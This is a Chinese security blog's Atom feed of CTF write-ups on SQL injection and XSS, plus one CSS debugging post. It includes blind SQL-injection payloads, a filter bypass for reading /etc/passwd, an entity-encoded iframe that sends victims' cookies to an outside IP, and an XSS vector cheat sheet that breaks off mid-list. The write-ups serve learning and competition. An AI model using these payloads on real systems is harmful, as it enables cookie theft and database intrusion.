<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mads Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://lxzmads.github.io/"/>
  <updated>2019-08-20T02:18:49.216Z</updated>
  <id>http://lxzmads.github.io/</id>
  
  <author>
    <name>Mads</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>记SUCTF2019一道简单的sqli</title>
    <link href="http://lxzmads.github.io/2019/08/20/%E8%AE%B0SUCTF2019%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84sqli/"/>
    <id>http://lxzmads.github.io/2019/08/20/记SUCTF2019一道简单的sqli/</id>
    <published>2019-08-20T01:40:40.000Z</published>
    <updated>2019-08-20T02:18:49.216Z</updated>
    
    <content type="html"><![CDATA[<p>这道题算是一道很CTF的注入题了吧（不知道线上哪里会出现此类情况）。</p><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p><img src="https://raw.githubusercontent.com/lxzmads/picbed/master/20190820094338.png" alt="20190820094338.png"></p><p>这道题后来貌似被玩坏了，中间有一段时间疯狂被交<code>flag</code>，原因是那时候输入非0数字就会返回<code>flag</code>，狗头。</p><p><img src="https://raw.githubusercontent.com/lxzmads/picbed/master/20190820100706.png" alt="20190820100706.png"></p><p>之前正常的时候是输入<code>0</code>返回<code>0</code>，输入其他数字返回<code>1</code>.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>跑了一下mysql相关的字典找一下过滤，发现过滤非常严格。</p><ul><li>过滤了<code>or</code>，导致没法用<code>or</code>不说，还没法查<code>information_schema</code>, 也就没法查列名。</li><li>发现可以用<code>show talbes</code>等查出数据库为<code>CTF</code>, 表名为<code>Flag</code>, 但是紧接着发现<code>flag</code>关键字也被过滤</li><li><code>select</code>没有被过滤，但是<code>from</code>被过滤了，所以根本就没法跨表查询，断了这条路，利用函数吧。</li><li>一些基本的函数如<code>database()</code>,<code>user()</code>,<code>version()</code>等都可以用。发现版本是<code>5.5.44-0ubuntu0.14.04.1-log</code>，好像比较低，可以用file相关操作。</li><li>发现可以<code>load_file()</code>,但是单引号貌似被<code>addslashes</code>了，双引号也被过滤了。想到利用编码绕过，成功读到了<code>/etc/passwd</code>文件。</li><li>尝试读<code>/var/www/html/index.php</code>文件时，发现提示<code>too long</code>，还有长度限制。测试了一下，发现长度限制时<code>40</code>。简单计算了一下，我可以读的文件编码前文件名大概只能有<code>13</code>个字符，<code>/var/www/html/index.php</code>妥妥的超了。</li><li>这里想了很久，一般绕长度限制就是用变量呗。查了一下<code>mysql</code>变量有两种，一种只在一次查询会话有效相当于临时变量，还有一种是全局变量。可以尝试利用全局变量存储长字符串，然后调用变量名绕过长度限制。想法很美好，但是现实是残酷的。这些全局变量名字都非常长，调用语句也没有那么短。这条路也没戏了。</li><li>中间当然也发现了可以用<code>exp</code>等函数盲注，但是表名被过滤了，列名不知道，也过滤了<code>from</code>，还只能写<code>40</code>个字符，盲注个头。</li><li>也发现了可以写多语句，但是发现<code>prepare</code>被过滤了，好像也没法用了吧。。坑是真的多。</li><li>这里感觉是没法做了，但是还是要善于观察。（对于有些师傅全天24小时扫管理员<code>.swp</code>文件然后拿到了源码的师傅，小弟实在是佩服，狗头）</li><li>观察会发现当输入数字<code>0</code>的时候，返回的是<code>0</code>。（题目没挂之前）输入其他数字都返回了<code>1</code>。通过输入输出我们可以简单猜一下sql语句的逻辑。这里假设列名是<code>flag</code>。sql语句可能是<code>select {输入} != flag from Flag</code>，这也是我当时猜的。后来看到师傅们的源码，真是情况是<code>select {输入} || flag from Flag</code>也差不多。到这里其实相对明了了。过滤了那么多花里胡哨的关键字，所以根本就没想让你注进来，而就是简单的让你猜一下sql语句，也算是个思路开拓题吧。</li><li>于是我们构造输入为<code>*,1</code>,构成sql查询为<code>select *,1||flag from Flag</code>，即可获取flag。</li></ul><p><img src="https://raw.githubusercontent.com/lxzmads/picbed/master/20190820101230.png" alt="20190820101230.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这道题算是一道很CTF的注入题了吧（不知道线上哪里会出现此类情况）。&lt;/p&gt;
&lt;h1 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Chromium’s Text Autosizer 排坑</title>
    <link href="http://lxzmads.github.io/2019/08/02/Chromium%E2%80%99s-Text-Autosizer-%E6%8E%92%E5%9D%91/"/>
    <id>http://lxzmads.github.io/2019/08/02/Chromium’s-Text-Autosizer-排坑/</id>
    <published>2019-08-02T11:50:31.000Z</published>
    <updated>2019-08-12T07:22:17.386Z</updated>
    
    <content type="html"><![CDATA[<p>闲来无事，想把丑陋的博客“整下容”。本来轻松愉快的改CSS，改的逍遥自在啊，直到发生了这件事。。。不想听我讲故事的直接到<a href="#总结">总结</a>即可。</p><h1 id="咦，难道我写bug了？"><a href="#咦，难道我写bug了？" class="headerlink" title="咦，难道我写bug了？"></a>咦，难道我写bug了？</h1><p>二零一九年八月二日的一个炎热的午后，辛苦了改了一天的我正准备调整一下最后的手机上的响应式布局相关的CSS代码。当我满心欢喜的改完之后打开我的Safari预览时，咦？怎么这两块的字体怎么一大一小？大概是下面这个样子：</p><p><img width="218" height="400" src="https://raw.githubusercontent.com/lxzmads/picbed/master/D377F564EED3F0D2C3C6D525E9726570.png"></p><p>这两个地方都是显示代码块的地方，为什么一个那么大，一个却正常？我当时眉头一紧，觉得可能CSS写的有问题。然而转念一想（其实调了好久，大约两个小时，最后还动用了一个远程调试的tool），不对呀。CSS针对的也不是位置啊，而是对标签的样式行为进行定义，然而这两块按理说都是一样的标签，从而也就是一样的CSS了。</p><h1 id="折磨"><a href="#折磨" class="headerlink" title="折磨"></a>折磨</h1><p>在苦苦思考不得而知的时候，我开始想起了求助某个全栈大佬，心想他写CSS比我熟练，可能知道些什么。然鹅经过一番QQ交谈，最终以“玄学”、“神奇”等词汇告终。然而此番交谈我得到了以下信息：</p><ul><li>在大佬的安卓机子上的浏览器（可能是firefox或者自带的）和QQ里面的浏览器打开，显示是正常的。</li><li>大佬也帮我检查了一下CSS，确实是没有问题的。</li><li>我随口分析时说，这两个地方除了内容，真的没什么不一样了（除了时空理论别和我杠=w=）。</li></ul><h1 id="拨云见雾"><a href="#拨云见雾" class="headerlink" title="拨云见雾"></a>拨云见雾</h1><p>于是，利用仅有的这些信息，我开始疯狂在浏览器里面fuzz。关键词组合太多这里就不列举了。最终利用如下关键词搜到了有用信息：</p><ul><li>css 字体变大（别笑！）</li></ul><p>全英文检索还真搜不到什么hhh。</p><p>搜到的是CSDN一位小哥一年前的记录，链接在<a href="https://blog.csdn.net/weixin_42034412/article/details/80462099" target="_blank" rel="noopener">这里</a>，通过他的博客我继续检索关键字<code>Text Autosizer</code>找到了以下有用的信息。</p><ul><li><a href="https://github.com/ccchangkong/article/issues/20" target="_blank" rel="noopener">Github一位小哥的分析</a></li><li><a href="https://docs.google.com/document/d/1PPcEwAhXJJ1TQShor29KWB17KJJq7UJOM34oHwYP3Zg/edit#heading=h.si6prvoucj2z" target="_blank" rel="noopener">官方文档</a></li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>于是总结一下就是：</p><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>在做webkit内核的移动端页面的时候，会发现某些字体会自动放大，放大的比例以及放大的时机看上去还没啥规律，很是诡异。</p><h2 id="原因及解决方案"><a href="#原因及解决方案" class="headerlink" title="原因及解决方案"></a>原因及解决方案</h2><ul><li>原因</li></ul><p>不是bug，是Chromium内核提高移动端文本可读性的一个特性，叫做这个特性被称做「Text Autosizer」，又称「Font Boosting」、「Font Inflation」</p><ul><li>解决</li></ul><ol><li>限定元素宽高</li><li>设置<code>-webkit-text-size-adjust: none;</code></li></ol><p>最后借用下老哥的图。</p><p><img src="https://raw.githubusercontent.com/lxzmads/picbed/master/687474703a2f2f7777312e73696e61696d672e636e2f6c617267652f36633762666231326777316638743067693064686f6a3230647230676f6a736f2e6a7067.jpeg" alt="687474703a2f2f7777312e73696e61696d672e636e2f6c617267652f36633762666231326777316638743067693064686f6a3230647230676f6a736f2e6a7067.jpeg"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;闲来无事，想把丑陋的博客“整下容”。本来轻松愉快的改CSS，改的逍遥自在啊，直到发生了这件事。。。不想听我讲故事的直接到&lt;a href=&quot;#总结&quot;&gt;总结&lt;/a&gt;即可。&lt;/p&gt;
&lt;h1 id=&quot;咦，难道我写bug了？&quot;&gt;&lt;a href=&quot;#咦，难道我写bug了？&quot; class
      
    
    </summary>
    
    
      <category term="排坑" scheme="http://lxzmads.github.io/tags/%E6%8E%92%E5%9D%91/"/>
    
      <category term="前端" scheme="http://lxzmads.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>通过CISCN2019一道SQL注入思考基于运行时错误的盲注</title>
    <link href="http://lxzmads.github.io/2019/04/23/%E9%80%9A%E8%BF%87CISCN2019%E4%B8%80%E9%81%93SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%80%83%E5%9F%BA%E4%BA%8E%E8%BF%90%E8%A1%8C%E6%97%B6%E9%94%99%E8%AF%AF%E7%9A%84%E7%9B%B2%E6%B3%A8/"/>
    <id>http://lxzmads.github.io/2019/04/23/通过CISCN2019一道SQL注入思考基于运行时错误的盲注/</id>
    <published>2019-04-23T06:13:17.000Z</published>
    <updated>2019-08-02T11:30:48.770Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次的CISCN WEB题感觉质量还不错。废话不多说，直接看题。</p><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>第一天的SQL注入一题，很容易发现服务端的返回有两种，一种是<code>登录失败</code>，另一种<code>数据库操作失败</code>。可以意识到可以盲注，但是与一般的盲注好像不太一样。比较常遇到的是服务端会根据sql语句的逻辑<code>true or false</code>来返回不同的东西，但是这里是根据sql语句的执行情况的<code>true or false</code>来返回不同的东西。当然如果前一种情况sql语句执行失败，服务端返回500的情况，也是适用于第二种情况的盲注的。所以说第二种情况的盲注方法更加的通用。刚好之前去六室面试时，学长们出了一道利用exp函数的特性进行注入的题。当时那题我在机试时在网上搜了一大堆，但是能搜到利用exp函数的报错来进行注入，但是需要错误回显。但当时那题是没有错误回显的，只提示错误和失败。题目也禁用了时间函数，也就是没法基于时间进行盲注。本来已经在放弃边缘了，机试一道题没做出来很凉，但是快结束时候突然灵光一闪想到了可以利用exp函数的参数在大于709的情况下会导致sql语句执行失败，这样其实就找到了一种方法来利用服务端的两种不同回显来判断我们自定义表达式的真假。比如这个表达式是<code>709 + c - ascii(&#39;a&#39;)</code>，让<code>c</code>初始化为<code>126</code>（最大可见字符），我们把它作为参数传给<code>exp</code>函数，这时sql语句必然是执行失败的，因为<code>709 + 126 - ascii(&#39;a&#39;) &gt; 709</code>。然后我们不断的<code>c--</code>，直到<code>c == ascii(&#39;a&#39;)</code>，那么就相当于<code>exp(709 + c - c) == exp(709)</code>，sql语句就会执行成功，这时的<code>c</code>就是<code>ascii(a)</code>，利用这种思路就可以进行盲注了。赛后看到别人的wp，意识到不止<code>exp</code>函数，包括<code>cot</code>，<code>pow</code>等只要能得到超大数导致超过mysql的数值范围的，sql语句就会执行失败：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select pow(2,1024);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range <span class="keyword">in</span> <span class="string">'pow(2,1024)'</span></span><br><span class="line">mysql&gt; select cot(0);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range <span class="keyword">in</span> <span class="string">'cot(0)'</span></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range <span class="keyword">in</span> <span class="string">'exp(710)'</span></span><br></pre></td></tr></table></figure><h1 id="发散"><a href="#发散" class="headerlink" title="发散"></a>发散</h1><p>当然我觉得除了利用MYSQL超过数值表示范围就报错这个点之外，还有其他的思路。我想到了是不是可以利用数学本身的约定来，比如除0操作。但是有意思的是mysql是允许除0的，只是会发生warning：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1/0;</span><br><span class="line">+------+</span><br><span class="line">| 1/0  |</span><br><span class="line">+------+</span><br><span class="line">| NULL |</span><br><span class="line">+------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span>, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure><p>包括<code>log(-1)</code>等都没法让sql语句执行失败，看来还是需要利用mysql本身的特性来搞。我还尝试利用if语句的条件与mysql执行高权限操作报错的特性以及查询不存在表名、列名报错等特性，但是发现mysql解释器貌似会对sql语句进行预检查，而不会在执行时检查，这样我们if条件就没法生效。于是去查了下MYSQL的<a href="https://dev.mysql.com/doc/refman/5.7/en/server-error-reference.html" target="_blank" rel="noopener">官方文档</a>，发现错误种类非常多。而我们需要的错误类型是<em>sql语句运行时产生</em>的。比方说上面利用的错误<code>ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(2,1024)&#39;</code>就是sql语句在运行时计算时产生的错误。</p><p>找呀找，找呀找。突然不想找了，意识到我们想要的运行时错误，不就是网上能搜到的那些报错注入的例子么。我们可以把他们变个方式，就可以进行盲注了。整理一下如下：</p><h2 id="Floor"><a href="#Floor" class="headerlink" title="Floor"></a>Floor</h2><p>因为floor报错注入的原理本身就是基于rand()函数在sql语句执行时的多次调用，所以我们可以直接改成盲注。经过测试，可以将测试条件放在<code>group by</code>之后。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Floor 报错注入改为报错盲注</span></span><br><span class="line">mysql&gt; select count(*),floor(rand(0)*2)x from mysql.user group by <span class="keyword">if</span>(1,x,0);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry <span class="string">'1'</span> <span class="keyword">for</span> key <span class="string">'&lt;group_key&gt;'</span></span><br><span class="line">mysql&gt; select count(*),floor(rand(0)*2)x from mysql.user group by <span class="keyword">if</span>(0,x,0);</span><br><span class="line">+----------+---+</span><br><span class="line">| count(*) | x |</span><br><span class="line">+----------+---+</span><br><span class="line">|        5 | 0 |</span><br><span class="line">+----------+---+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="Spatial-Functions"><a href="#Spatial-Functions" class="headerlink" title="Spatial Functions"></a>Spatial Functions</h2><p>网上还普遍存在的通过传入非法参数给空间函数进行报错注入的方法，貌似在盲注的情况下没法成功。因为测试发现mysql解释器在解析sql语句中这类函数的参数时候就会检查合法性，所以不满足我们之前说的需要sql语句运行时检查的条件。但是在<a href="https://dev.mysql.com/doc/refman/5.7/en/gis-data-formats.html" target="_blank" rel="noopener">官方文档</a>发现了有意思的东西。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原方法没法让if条件生效</span></span><br><span class="line">mysql&gt; SELECT IF(1,ST_X(LINESTRING(mads)),0);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric <span class="string">'1'</span> value found during parsing</span><br><span class="line">mysql&gt; SELECT IF(0,ST_X(LINESTRING(mads)),0);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric <span class="string">'1'</span> value found during parsing</span><br></pre></td></tr></table></figure><p>文档中发现了两个函数<code>ST_GeomFromText</code>、<code>ST_MPointFromText</code>可以从文本中解析Spatial function，我下意识的觉得这里可能可以绕过mysql解释器的预检查，测试了一下果然是可以的。需要说明的是<code>ST_GeomFromText</code>针对的是<code>POINT()</code>函数，<code>ST_MPointFromText</code>针对的是<code>MULTIPOINT()</code>函数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT IF(1, ST_X(ST_GeomFromText(<span class="string">'POINT(mads)'</span>)), 0);</span><br><span class="line">ERROR 3037 (22023): Invalid GIS data provided to <span class="keyword">function</span> st_geometryfromtext.</span><br><span class="line">mysql&gt; SELECT IF(0, ST_X(ST_GeomFromText(<span class="string">'POINT(mads)'</span>)), 0);</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">| IF(0, ST_X(ST_GeomFromText(<span class="string">'POINT(mads)'</span>)), 0) |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">|                                              0 |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p>于是整理了一下可用的函数payload如下：</p><blockquote><p><code>{}</code>中是需要判断的条件</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># POINT</span></span><br><span class="line">SELECT IF(&#123;&#125;, ST_X(ST_GeomFromText(<span class="string">'POINT(mads)'</span>)), 0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_MPointFromText(<span class="string">'MULTIPOINT (mads)'</span>),0);</span><br></pre></td></tr></table></figure><p>这里还可以拓展下思路，就是其实我们需要的只是个动态解析变量的函数来绕过mysql解释器的预检，所以下面的payload同样都是可以的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT IF(&#123;&#125;, ST_X(MADS), 0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_MPointFromText(<span class="string">'MADS'</span>),0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_GeomFromText(<span class="string">'MADS'</span>),0);</span><br></pre></td></tr></table></figure><h2 id="其他特性的报错"><a href="#其他特性的报错" class="headerlink" title="其他特性的报错"></a>其他特性的报错</h2><p>翻阅文档与测试之后，只找到额外的以下可行payload。</p><ol><li>基于错误号1242</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="keyword">if</span>(1, (select user from user), 0);</span><br><span class="line">ERROR 1242 (21000): Subquery returns more than 1 row</span><br><span class="line">mysql&gt; select <span class="keyword">if</span>(0, (select user from user), 0);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| <span class="keyword">if</span>(0, (select user from user), 0) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| 0                                 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p>可能还有很多，这里只是举个栗子，就不一一列举，各位师傅感兴趣的可以自己尝试去找找。找到了新思路欢迎评论交流～</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文介绍了基于sql语句运行时发生错误的盲注，简称<code>基于运行时错误的盲注</code>(我起的)。并通过思维发散介绍了几种衍生的payload。由于本人精力与能力有限，肯定没有介绍完全。各位师傅可以自由发挥想象，想到了其他方法欢迎评论区讨论交流～</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这次的CISCN WEB题感觉质量还不错。废话不多说，直接看题。&lt;/p&gt;
&lt;h1 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; cla
      
    
    </summary>
    
    
      <category term="SQL" scheme="http://lxzmads.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑2019一道XSS记录</title>
    <link href="http://lxzmads.github.io/2019/04/11/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912019%E4%B8%80%E9%81%93XSS%E8%AE%B0%E5%BD%95/"/>
    <id>http://lxzmads.github.io/2019/04/11/西湖论剑2019一道XSS记录/</id>
    <published>2019-04-11T08:36:46.000Z</published>
    <updated>2019-04-11T13:04:03.000Z</updated>
    
    <content type="html"><![CDATA[<p>通过复现这道题，觉得这么简单的题怎么当时没做出来，感觉自己状态是不对的。其实赛前觉得自己挺有信心的，现在看来应该是属于信心过头，变得有点傲慢了。而且比赛过程中并没有很坚持的去做题，总结一个字，”菜“。 记录这篇复现当作反思，常温习常警醒。</p><p>希望自己以后遇到问题能够 <code>Try it harder and harder and harder...</code></p><h1 id="Breakout"><a href="#Breakout" class="headerlink" title="Breakout"></a>Breakout</h1><p>说实话这名字让我以为要绕同源策略，结果发现根本就不用。拿到shell之后发现题目的waf真的很简单，就是下面这个：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $black_list = <span class="string">"script|\W+on.*?="</span>;</span><br><span class="line">    $str = preg_replace(<span class="string">"/"</span>.$black_list.<span class="string">"/i"</span>,<span class="string">":)"</span>,$str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是只要利用简单的编码就可以绕过了， 一个可行的payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#49;&amp;#50;&amp;#51;&amp;#46;&amp;#50;&amp;#48;&amp;#54;&amp;#46;&amp;#49;&amp;#54;&amp;#53;&amp;#46;&amp;#49;&amp;#54;&amp;#53;&amp;#47;&amp;#63;&amp;#99;&amp;#61;&amp;#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>比赛时候说实话很久没做web，测试了一下<code>&lt;img&gt;</code>的src不能work之后就没测试<code>&lt;iframe&gt;</code>的了。然后一直想直接csrf让bot来直接执行命令，但是一直没打通。我的做法是在iframe里面构造一个表单然后提交，表单就是直接执行exec.php的，因为表单是不受同源策略限制的，在<code>iframe</code>里面虽然origin是null，但是是可以发起请求的。后来我猜想是bot的问题。</p><p>这道题的bot用的是chromedriver来解析我们的页面的，版本如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ChromeDriver 2.42.591071 (0b695ff80972cc1a65a5cd643186d2ae582cd4ac)</span><br></pre></td></tr></table></figure><p>我下载了这个版本的driver本地测试了一下。测试了很久，还是没找到原因，感觉是他的bot加了什么参数导致iframe里面的表单无法被提交，有知道的师傅麻烦告诉我一下。。。</p><p>终于找到原因了，原来是他的bot挂了hhhh，坑啊，虽然加上300分也没什么用，无所谓啦。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;通过复现这道题，觉得这么简单的题怎么当时没做出来，感觉自己状态是不对的。其实赛前觉得自己挺有信心的，现在看来应该是属于信心过头，变得有点傲慢了。而且比赛过程中并没有很坚持的去做题，总结一个字，”菜“。 记录这篇复现当作反思，常温习常警醒。&lt;/p&gt;
&lt;p&gt;希望自己以后遇到问题
      
    
    </summary>
    
    
      <category term="Web安全" scheme="http://lxzmads.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="http://lxzmads.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>XSS Attack Notes</title>
    <link href="http://lxzmads.github.io/2019/04/10/XSS-Attack-Notes/"/>
    <id>http://lxzmads.github.io/2019/04/10/XSS-Attack-Notes/</id>
    <published>2019-04-10T08:39:04.000Z</published>
    <updated>2019-04-10T08:51:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS检测"><a href="#XSS检测" class="headerlink" title="XSS检测"></a>XSS检测</h1><p>用于探测XSS的存在性。</p><ul><li>XSS Locator(Polygot)<ul><li><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload=&#39;+/&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//&#39;&gt;</code></li></ul></li></ul><h1 id="基本姿势"><a href="#基本姿势" class="headerlink" title="基本姿势"></a>基本姿势</h1><p>基本姿势在<a href>XSS Concept Notes</a>的<code>HTML Injection</code>一节的<code>ways</code>部分作了基本介绍。XSS 目的是执行JS代码达成我们目的，总结下可以执行JS代码的地方：</p><h2 id="可以X的地方"><a href="#可以X的地方" class="headerlink" title="可以X的地方"></a>可以X的地方</h2><ul><li><code>&lt;script&gt;</code>标签内</li><li>写在外部，通过<code>&lt;script src=</code>引入</li><li>一些放URL的地方利用<code>javascript:</code>伪协议<ul><li><code>src</code>处经过测试，可以work的好像只有<code>iframe</code>了，其他的比如<code>img</code>等只在IE6上测试通过</li><li><code>form</code>的<code>action</code></li><li>普通标签带有form属性的<code>formaction</code></li><li><code>href</code></li></ul></li><li><code>src</code>里用<code>data</code>协议</li><li><code>iframe</code>的<code>srcdoc</code>直接写标签</li><li>各种<code>on</code>事件里（on事件见附录</li></ul><h2 id="XSS-Vector-举栗"><a href="#XSS-Vector-举栗" class="headerlink" title="XSS Vector 举栗"></a>XSS Vector 举栗</h2><ul><li><code>&lt;img src=javascript:alert(1) &gt;</code> // IE6</li><li><code>&lt;IMG DYNSRC=&quot;javascript:alert(‘XSS’)&quot;&gt;</code> // IE6</li><li><code>&lt;IMG LOWSRC=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</code> // IE6</li><li><code>&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&#39;XSS&#39;))”&gt;</code>  // IE6</li><li><code>&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&#39;XSS&#39;);”&gt;</code> // IE6</li><li><code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt;</code> // IE6</li><li><code>&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;</code> // IE6</li><li><code>&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;</code> // IE6</li><li><code>&lt;STYLE&gt;@im\port&#39;\ja\vasc\ript:alert(&quot;XSS&quot;)&#39;;&lt;/STYLE&gt;</code> // IE6</li><li><code>&lt;STYLE&gt;@import&#39;http://xss.rocks/xss.css&#39;;&lt;/STYLE&gt;</code> //IE6</li><li><code>&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://xss.rocks/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;</code> // IE6</li><li><code>&lt;style&gt;#test{x:expression(alert(/XSS/))}&lt;/style&gt;</code> //IE6</li><li><code>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#39;XSS&#39;);”&gt;</code> //IE6</li><li><code>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://xss.rocks/xss.css”&gt;</code> //IE6</li><li><code>&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet”&gt;</code> // IE6</li><li><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&#39;XSS&#39;);”&gt;</code> // IE6</li><li><code>&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;/FRAMESET&gt;</code></li><li><code>&lt;iframe src=javascript:alert(1) 